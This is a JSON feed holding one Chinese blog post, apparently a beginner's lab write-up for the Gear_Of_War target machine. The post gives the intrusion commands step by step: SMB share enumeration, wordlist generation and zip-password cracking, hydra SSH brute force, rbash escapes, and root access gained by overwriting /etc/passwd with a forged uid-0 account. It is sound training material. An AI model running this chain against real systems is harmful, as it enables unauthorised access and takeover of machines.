{
    "version": "https://jsonfeed.org/version/1",
    "title": "Go Forward • All posts by \"gear_of_war靶场笔记\" tag",
    "description": "欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷",
    "home_page_url": "https://chungod.github.io",
    "items": [
        {
            "id": "https://chungod.github.io/2021/08/19/Gear_Of_War%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/",
            "url": "https://chungod.github.io/2021/08/19/Gear_Of_War%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/",
            "title": "Gear_Of_War靶场笔记",
            "date_published": "2021-08-19T13:00:00.000Z",
            "content_html": "<h2 id=\"gear_of_war靶场笔记\"><a class=\"markdownIt-Anchor\" href=\"#gear_of_war靶场笔记\">#</a> Gear_Of_War 靶场笔记</h2>\n<h3 id=\"信息收集\"><a class=\"markdownIt-Anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<p>先扫描靶机基本信息</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819151259588.png\" alt=\"image-20210819151259588\"></p>\n<p>发现开放了 139 和 445 的 smb 端口，靶机系统为 Ubuntu</p>\n<p>继续探测 smb 服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">命令</span><br><span class=\"line\">enum4linux -S IP</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819151554260.png\" alt=\"image-20210819151554260\"></p>\n<h3 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">发现靶机开启了该共享 //172.16.101.250/LOCUS_LAN$</span><br><span class=\"line\">利用smbclient --user=share 共享名  进行连接（无密码）</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819151819536.png\" alt=\"image-20210819151819536\"></p>\n<p>发现两个文件 msg_horda.zip 和 SOS.txt，GET 下载进行分析</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819152044735.png\" alt=\"image-20210819152044735\"></p>\n<h3 id=\"字典生成\"><a class=\"markdownIt-Anchor\" href=\"#字典生成\">#</a> 字典生成</h3>\n<p>发现奇怪字符 [@%%,]，在密码学 crunch 中具有特殊意义</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ 代表小写字母，% 代表数字，, 代表大写字符， ^ 代表特殊符号</span><br></pre></td></tr></table></figure>\n<p>所以利用 crunch 工具进行密码生成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crunch 4 4 -t @%%, -o wordlist</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819152422139.png\" alt=\"image-20210819152422139\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819152454714.png\" alt=\"image-20210819152454714\"></p>\n<h3 id=\"密码爆破\"><a class=\"markdownIt-Anchor\" href=\"#密码爆破\">#</a> 密码爆破</h3>\n<p>使用 fcrackzip 工具，配合第二题生成的字典文件进行密码爆破，获取到 msg_horda.zip 的密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">命令：</span><br><span class=\"line\">fcrackzip -D -p wordlist -u msg_horda.zip</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819152649032.png\" alt=\"image-20210819152649032\"></p>\n<p>成功破解得到 zip 密码 <strong>r44M</strong>，利用密码解压 msg_horda.zip 得到<strong> key.txt</strong></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819152845000.png\" alt=\"image-20210819152845000\"></p>\n<p>查看 key.txt，得到了一串字符 3_d4y，又发现靶机开启了 22 端口，</p>\n<p>猜测可能是 ssh 服务的密码</p>\n<h3 id=\"用户爆破\"><a class=\"markdownIt-Anchor\" href=\"#用户爆破\">#</a> 用户爆破</h3>\n<p>一、</p>\n<p>浏览靶机 web 端 robots.txt，猜测用户名生成字典</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819153202139.png\" alt=\"image-20210819153202139\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819153431092.png\" alt=\"image-20210819153431092\"></p>\n<p>利用自身生成的用户字典和密码 3_d4y 爆破 SSH 服务，得到 SSH 服务用户名 marcus</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hydra -L user.txt -p 3_d4y -t 64 ssh://172.16.101.250</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819153615140.png\" alt=\"image-20210819153615140\"></p>\n<p>二、</p>\n<p>使用 /usr/share/wordlists/rockyou.txt 作为用户名字典，结合得到的密码尝试爆破 ssh 服务</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819153715970.png\" alt=\"image-20210819153715970\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">先利用 zcat 进行解压gz文件，得到用户名字典</span><br><span class=\"line\">zcat rockyou.txt.gz &gt;rockyou.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819153805810.png\" alt=\"image-20210819153805810\"></p>\n<p>利用九头蛇进行爆破，由于字典太大，需要慢慢等待</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hydra -L rockyou.txt -p 3_d4y -t 64 ssh://172.16.101.250</span><br><span class=\"line\">实在不行就利用翻转重新爆破，rev rockyou.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"ssh服务渗透\"><a class=\"markdownIt-Anchor\" href=\"#ssh服务渗透\">#</a> SSH 服务渗透</h3>\n<p>利用知道的用户名和密码进行连接 ssh, 如若出现以下情况，可尝试重写输入 ssh marcus@172.16.101.250 进行连接即可</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819154553166.png\" alt=\"image-20210819154553166\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh marcus@172.16.101.250 (密码3_d4y) </span><br></pre></td></tr></table></figure>\n<p>成功登录 marcus 用户，但是为低权限</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819154716920.png\" alt=\"image-20210819154716920\"></p>\n<h3 id=\"rbash逃逸和提权\"><a class=\"markdownIt-Anchor\" href=\"#rbash逃逸和提权\">#</a> rbash 逃逸和提权</h3>\n<p>首先，查看可用提权，发现无法成功</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819154911595.png\" alt=\"image-20210819154911595\"></p>\n<p>需要利用 rbash 逃逸</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi</span><br><span class=\"line\">:set shell=/bin/sh</span><br><span class=\"line\">:shell</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819155406364.png\" alt=\"image-20210819155406364\"></p>\n<p>也可以利用 python 进行逃逸，如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c <span class=\"string\">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class=\"line\">python -c <span class=\"string\">&#x27;import os;os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>或者 ssh 服务登录前也可以加入参数逃逸</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh marcus@172.16.101.250 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"su提权\"><a class=\"markdownIt-Anchor\" href=\"#su提权\">#</a> su 提权</h3>\n<p>逃逸成功后，发现可以利用 su 提权</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">思路：</span><br><span class=\"line\">当前的环境下可以执行cp和su、sudo权限，即可进行伪造、覆盖passwd文件进行su提权</span><br><span class=\"line\">所以，先生成一个伪造用户hack，指定root权限，生成passwd文件进行覆盖/etc/passwd文件，再利用su hack成功提权</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">命令：生成passwd文件的加密用户hack和密码hack</span><br><span class=\"line\">openssl passwd -1 -salt hack hack</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819160109752.png\" alt=\"image-20210819160109752\"></p>\n<p>创建 /root/passwd 文件，将 /etc/passwd 文件复制进去，添加 hack</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim passwd</span><br><span class=\"line\">添加hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/root:/bin/bash</span><br><span class=\"line\">覆盖/etc/passwd文件</span><br><span class=\"line\">cp -p passwd /etc/passwd</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819160311685.png\" alt=\"image-20210819160311685\"></p>\n<p>切换 hack 用户，成功<strong>提权</strong></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210819160519286.png\" alt=\"image-20210819160519286\"></p>\n",
            "tags": [
                "Gear_Of_War靶场笔记"
            ]
        }
    ]
}